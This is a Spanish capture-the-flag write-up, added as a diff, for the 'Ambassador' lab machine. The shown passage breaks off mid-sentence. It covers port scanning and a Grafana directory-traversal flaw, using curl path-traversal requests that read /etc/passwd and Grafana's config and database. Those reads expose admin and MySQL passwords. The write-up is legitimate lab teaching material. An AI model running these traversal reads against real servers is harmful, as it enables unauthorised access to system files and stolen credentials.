@@ -1,0 +1,142 @@
+---
+title: 'CTF - Ambassador WriteUp'
+date: '2023-01-01'
+tags: ["Grafana", "Git", "Rce", "Lfi", "CTF", "Directory Path Traversal"]
+draft: true
+authors: ['default']
+summary: '![](/static/images/uploads/ctf-ambassador-writeup/Ambassador.webp)'
+---
+
+![](/static/images/uploads/ctf-ambassador-writeup/Ambassador.webp)
+
+Esta máquina ha sido una que me ha gustado mucho. Sobre todo la primera parte hasta llegar a la escalada de privilegios.
+
+Enumeración
+-----------
+
+
+```
+ nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.183
+
+# Output
+[*] Open ports: 22,80,3000,3306
+```
+Si analizamos concretamente los puertos expuestos, nos encontramos con la siguiente información.
+
+
+```
+ nmap -p22,80,3000,3306 -vvv -sCV 10.10.11.183 -oN targeted
+
+# Output
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
+80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-generator: Hugo 0.94.2
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-title: Ambassador Development Server
+3000/tcp open  ppp?    syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Sun, 01 Jan 2023 19:33:04 GMT
+|     Content-Length: 29
+|     href="/login"Found.
+3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.30-0ubuntu0.20.04.2
+|   Thread ID: 15
+|   Capabilities flags: 65535
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+Tenemos el puerto de *SSH*, lo que parece un s*ervidor web* típico en el puerto 80, algo desconocido en el puerto 3000 y una base de datos *MySQL* en el puerto 3306.
+
+Local File Inclusion
+--------------------
+
+Como me corroe la curiosidad, empiezo por el puerto 3000 y me encuentro Grafana instalado.
+
+![](/static/images/uploads/ctf-ambassador-writeup/image.webp)
+
+Una búsqueda rápida en searchsploit me devuelve una vulnerabilidad para las versiones de Grafana anteriores a la versión 8.3.
+
+
+```
+ searchsploit grafana 8.3
+---------------------------------------------------------------------------
+ Exploit Title                                               |  Path
+---------------------------------------------------------------------------
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read  |    multiple/webapps/50581.py
+---------------------------------------------------------------------------
+```
+Examinando un poco el exploit, vemos que podemos provocar un LFI con un simple comando de CURL.
+
+
+```
+ curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/passwd
+
+# Output
+root:x:0:0:root:/root:/bin/bash
+...
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+...
+grafana:x:113:118::/usr/share/grafana:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+consul:x:997:997::/home/consul:/bin/false
+```
+Buscando un poco por archivos que pueden resultarnos de interés en este caso, examinamos el archivo de configuración de Grafana almacenado en */etc/grafana/grafana.ini*.
+
+
+```
+ curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/grafana/grafana.ini
+
+# Output
+...
+# default admin user, created on startup
+;admin_user = admin
+
+# default admin password, can be changed before first start of grafana,  or in profile settings
+admin_password = messageInABottle685427
+...
+```
+Con esas credenciales, podemos entrar directamente al panel de Grafana. En él, vemos que hay una base de datos MySQL configurada, pero no podemos ver sus credenciales. Además de eso, no hay mucho más que podamos hacer por esa vía. Otra ruta de interés es */var/lib/grafana/grafana.db.*
+
+![](/static/images/uploads/ctf-ambassador-writeup/image-1.webp)
+
+Mysql configurado en GrafanaEsta ruta contiene una base de datos *sqlite,* donde se almacenan los Dashboards configurados. Con el siguiente comando nos descargamos la base de datos.
+
+
+```
+curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+100  644k  100  644k    0     0   529k      0  0:00:01  0:00:01 --:--:--  529k
+```
+Y empezamos a mirar cosas:
+
+
+```
+ sqlite3 grafana.db
+sqlite .tables
+...          
+data_source                 test_data                 
+...
+sqlite select * from data_source;
+2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-01 19:26:31|0|{}|1|uKewFgM4z
+```
+Llegado a este punto, probamos a 
+
